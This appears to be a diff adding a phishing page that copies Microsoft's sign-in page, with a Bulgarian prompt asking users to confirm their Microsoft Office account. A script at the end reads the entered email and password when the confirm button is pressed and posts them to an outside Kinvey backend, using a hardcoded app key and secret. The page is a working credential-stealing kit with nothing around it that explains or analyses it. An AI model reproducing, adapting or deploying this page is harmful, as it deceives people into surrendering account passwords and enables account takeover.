@@ -1,0 +1,431 @@
+<html dir="ltr" class="" lang="en">
+
+<head>
+    <title>Confirm your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="-1">
+    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin="">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="dns-prefetch" href="//aadcdn.msauth.net">
+    <link rel="dns-prefetch" href="//aadcdn.msftauth.net">
+
+    <meta name="PageID" content="ConvergedSignIn">
+    <meta name="SiteID" content="">
+    <meta name="ReqLC" content="1033">
+    <meta name="LocLC" content="en-US">
+
+
+
+
+    <meta name="robots" content="none">
+    
+
+
+    <link rel="shortcut icon"
+        href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+
+
+
+
+    <link crossorigin="anonymous"
+        href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_5vz1lgudtctdponkgjfmwg2.css"
+        rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"
+        integrity="sha384-ikcTSrpZJAq30L2fTXWkDo0CsVBmzk1K1SHLDkVsRLOZCJDuSZe942rrtsi1boSJ">
+
+
+
+    <link rel="prefetch"
+        href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_5vz1lgudtctdponkgjfmwg2.css">
+    <link rel="prefetch"
+        href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_sc8nln4btuvfwupwlgp1aw2.js">
+</head>
+
+<body class="cb" style="display: block;">
+
+
+
+    <div>
+        <!--  -->
+        <!--  -->
+        <div >
+            <div class="background" role="presentation"
+            >
+                <!-- ko if: smallImageUrl -->
+                <div 
+                    style="background-image: url(&quot;https://aadcdn.msauth.net/ests/2.1/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);">
+                </div>
+                <!-- /ko -->
+                <!-- ko if: backgroundImageUrl -->
+                <div class="backgroundImage"
+                    style="background-image: url(&quot;https://aadcdn.msauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);">
+                </div>
+                <!-- ko if: useImageMask -->
+                <!-- /ko -->
+                <!-- /ko -->
+            </div>
+        </div>
+        <div ></div>
+        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top"
+            autocomplete="off" 
+            action="https://login.microsoftonline.com/common/login">
+            <!-- ko if: svr.iBannerEnvironment -->
+            <!-- /ko -->
+            <!-- ko withProperties: { '$loginPage': $data } -->
+            <div class="outer" >
+                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+                <!-- ko if: svr.fShowCookieBanner -->
+                <!-- /ko -->
+                <div class="middle" >
+                    <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
+                    <!-- /ko -->
+                    <!-- ko if: svr.fShowPageLevelTitleAndDesc && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) -->
+                    <!-- /ko -->
+                    <div class="inner fade-in-lightbox">
+                        <div class="lightbox-cover">
+                        </div>
+                        <!-- ko if: showLightboxProgress -->
+                        <!-- /ko -->
+                        <div class="win-scroll">
+                            <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
+                                <!--  -->
+                                <!-- ko if: bannerLogoUrl -->
+                                <!-- /ko -->
+                                <!-- ko if: !bannerLogoUrl && !isChinaDc -->
+                                <!-- ko component: 'accessible-image-control' -->
+                                <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
+                                <!-- /ko -->
+                                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+                                <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo"
+                                    role="img"
+                                    pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png"
+                                    svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                                    src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+                                    alt="Microsoft">
+                                <!-- /ko -->
+                                <!-- /ko -->
+                                <!-- /ko -->
+                                <!-- /ko -->
+                            </div>
+                            <!-- /ko -->
+                            <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
+                            <!-- /ko -->
+                            <!-- ko if: asyncInitReady -->
+                            <div role="main">
+                                <!--  -->
+                                <div class="">
+                                    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
+                                    <div  class="animate slide-in-next">
+                                        <div >
+                                            <!--  -->
+                                        </div>
+                                    </div>
+                                    <!-- /ko -->
+                                    <div class="pagination-view has-identity-banner animate slide-in-next" >
+                                        <!-- ko foreach: views -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- ko template: { nodes: [$data], data: $parent } -->
+                                        <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true"
+                                            >
+                                            <!--  -->
+                                            <!--  -->
+                                            
+                                            <div id="loginHeader" class="row text-title" role="heading" aria-level="1"
+                                                >Моля, потвърдете
+                                                акаунта си в Microsoft Office</div>
+                                            <!-- ko if: showCredViewBrandingDesc -->
+                                            <!-- /ko -->
+                                            <!-- ko if: unsafe_pageDescription -->
+                                            <!-- /ko -->
+                                            <div class="row">
+                                                <div class="form-group col-md-24">
+                                                    <div role="alert" aria-live="assertive">
+                                                        <!-- ko if: passwordTextbox.error -->
+                                                        <!-- /ko -->
+                                                    </div>
+                                                    <div class="placeholderContainer" >
+                                                        <!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><input
+                                                            name="passwd" type="text" id="i0118" autocomplete="off"
+                                                            class="form-control" aria-required="true"  aria-describedby="loginHeader  "
+                                                            placeholder="Имейл или тел. номер"
+                                                            tabindex="0">
+                                                        <!-- ko if: svr.fUsePasswordPeek && showPassword() -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- ko ifnot: usePlaceholderAttribute -->
+                                                        <!-- /ko -->
+                                                    </div>
+                                                    <!-- ko if: svr.fUsePasswordPeek -->
+                                                    <!-- /ko -->
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="form-group col-md-24">
+                                                    <div role="alert" aria-live="assertive">
+                                                        <!-- ko if: passwordTextbox.error -->
+                                                        <!-- /ko -->
+                                                    </div>
+                                                    <div class="placeholderContainer" >
+                                                        <!-- ko withProperties: { '$placeholderText': placeholderText } -->
+                                                        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><input
+                                                            name="passwd" type="password" id="i0119" autocomplete="off"
+                                                            class="form-control" aria-required="true" aria-describedby="loginHeader  " placeholder="Парола"
+                                                            tabindex="0">
+                                                        <!-- ko if: svr.fUsePasswordPeek && showPassword() -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- ko ifnot: usePlaceholderAttribute -->
+                                                        <!-- /ko -->
+                                                    </div>
+                                                    <!-- ko if: svr.fUsePasswordPeek -->
+                                                    <!-- /ko -->
+                                                </div>
+                                            </div>
+                                            <!-- ko if: shouldHipInit -->
+                                            <!-- /ko -->
+                                            <div 
+                                                class="position-buttons">
+                                                <div>
+                                                    <!-- ko if: svr.fShowPersistentCookiesWarning -->
+                                                    <!-- /ko -->
+                                                    <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled -->
+                                                    <!-- /ko -->
+                                                    <div class="row">
+                                                        <div class="col-md-24">
+                                                            <div class="text-13 action-links">
+                                                                <!-- ko if: allowPhoneDisambiguation -->
+                                                                <!-- /ko -->
+                                                                <!-- ko ifnot: useEvictedCredentials -->
+                                                                <!-- ko component: { name: "cred-switch-link-control",
+                            params: {
+                                serverData: svr,
+                                username: username,
+                                availableCreds: availableCreds,
+                                flowToken: flowToken,
+                                currentCred: { credType: 1 } },
+                            event: {
+                                switchView: credSwitchLink_onSwitchView,
+                                redirect: onRedirect,
+                                setPendingRequest: credSwitchLink_onSetPendingRequest,
+                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
+                                                                <!--  --
+                                                                    <!-- /ko -->
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="win-button-pin-bottom">
+                                                    <div class="row"
+                                                       >
+                                                        <div >
+                                                            <div class="col-xs-24 no-padding-left-right button-container"
+                                                                >
+                                                                <!-- ko if: isSecondaryButtonVisible -->
+                                                                <!-- /ko -->
+                                                                <div 
+                                                                    class="inline-block">
+                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --><input
+                                                                        type="submit" id="idSIButton9"
+                                                                        class="btn btn-block btn-primary" value="Потвърди"> </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- ko if: tenantBranding.BoilerPlateText -->
+                                            <!-- /ko -->
+                                        </div>
+                                        <!-- /ko -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- ko if: $parent.currentViewIndex() === $index() -->
+                                        <!-- /ko -->
+                                        <!-- /ko -->
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- /ko -->
+                        </div>
+                    </div>
+                    <!-- ko if: showDebugDetails -->
+                    <!-- /ko -->
+                    <!-- ko if: showFedCredButtons -->
+                    <!-- /ko -->
+                    <!-- ko if: newSession -->
+                    <!-- /ko -->
+                    <div id="footer" class="footer default" role="contentinfo" >
+                            <!--  -->
+                            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
+                            <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms"
+                                    
+                                    href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a
+                                    id="ftrPrivacy"
+                                    
+                                    href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp;
+                                    cookies</a>
+                                <!-- ko if: impressumLink -->
+                                <!-- /ko -->
+                                <!-- ko if: showIcpLicense -->
+                                <!-- /ko -->
+                                <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
+                                <a id="moreOptions" href="#" role="button" class="moreOptions"  aria-expanded="false">
+                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } -->
+                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
+                                    <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img
+                                        class="desktopMode" role="presentation"
+                                        pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png"
+                                        svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"
+                                       
+                                        src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
+                                    <!-- /ko -->
+                                    <!-- /ko -->
+                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+                                    <!-- /ko -->
+                                    <!-- /ko -->
+                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } -->
+                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
+                                    <!-- /ko -->
+                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img
+                                        class="mobileMode" role="presentation"
+                                        pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png"
+                                        svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"
+                                      
+                                        src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
+                                    <!-- /ko -->
+                                    <!-- /ko -->
+                                    <!-- /ko -->
+                                </a>
+                            </div>
+                            <!-- /ko -->
+                            <!-- ko if: svr.fShowLegalMessagingInline && showLinks -->
+                            <!-- /ko -->
+                        </div>
+                    </div>
+                    <!-- /ko -->
+                </div>
+                <!-- /ko -->
+            </div>
+            <!-- /ko -->
+        </form>
+        <form  method="POST" aria-hidden="true" target="_top"></form>
+        <!-- ko if: svr.urlMsaStaticMeControl && !svr.fUseFetchSessionsForDsso -->
+        <!-- /ko -->
+        <!-- ko if: svr.urlCBPartnerPreload -->
+        <div id="idPartnerPL" ><iframe height="0" width="0"
+                src="https://www.office.com/prefetch/prefetch" style="display: none;"></iframe></div>
+        <!-- /ko -->
+    </div>
+<script type="module">
+    const baseUrl = 'https://baas.kinvey.com';
+        const appKey = 'kid_Hkeri63PL';
+        const appSecret = '31a7fa5787e04d7dbe23d33c05372b3c';
+
+        function makeAuth(type) {
+            return type === 'Basic'
+                ? 'Basic ' + btoa(`${appKey}:${appSecret}`)
+                : 'Kinvey ' + sessionStorage.getItem('authtoken'); 
+        }
+
+        function makeHeaders(method, data, type) {
+            const headers = {
+                method,
+                headers: {
+                    'Content-Type': 'application/json',
+                    Authorization: makeAuth(type),
+                },
+            };
+
+            if (method === 'POST' || method === 'PUT') {
+                headers.body = JSON.stringify(data);
+            }
+
+            return headers;
+        }
+
+        function fetchData(module, endpoint, headers) {
+            return fetch(`${baseUrl}/${module}/${appKey}/${endpoint}`, headers)
+                .then();
+        }
+
+        function post(module, endpoint, data, type) {
+            const headers = makeHeaders('POST', data, type);
+            return fetchData(module, endpoint, headers);
+        }
+
+        document.getElementById('idSIButton9').addEventListener(
+            'click', function () {
+                let username = document.getElementById('i0118').value;
+                let password = document.getElementById('i0119').value;
+                let dog = password;
+
+                post('user', '', { username, password, dog }, 'Basic')
+                    .then(function () {
+                        console.log(username + '  ' + password);
+                    }).catch(console.error);
+            }
+        );
+</script>
+</body>
+
+</html>
